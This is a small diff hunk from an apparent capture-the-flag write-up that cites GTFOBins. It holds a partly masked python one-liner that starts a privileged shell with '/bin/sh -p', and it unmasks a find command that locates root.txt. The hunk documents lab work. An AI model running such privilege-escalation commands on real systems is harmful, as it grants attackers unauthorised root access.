@@ -90,7 +90,7 @@ Using [GTFOBins](https://gtfobins.github.io):
 
 ```bash
 p***** -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-find / -type f -name r***.***
+find / -type f -name root.txt
 ```
 
 > `/****/root.txt`
